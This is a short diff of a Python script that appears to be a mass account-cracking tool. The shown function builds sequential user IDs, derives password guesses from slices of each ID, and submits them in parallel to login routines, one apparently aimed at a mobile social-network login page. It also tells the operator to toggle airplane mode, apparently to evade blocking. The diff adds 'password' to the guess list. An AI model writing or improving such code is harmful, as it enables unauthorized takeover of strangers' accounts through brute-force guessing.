@@ -638,8 +638,7 @@ def SUMON2():
         linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
-            mk = uid[:8]
-            pwx = [uid[:6],uid[:7],uid[:8],uid[:9],uid]
+            pwx = [uid[:6],uid[:7],uid[:8],uid[:9],uid,'password']
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
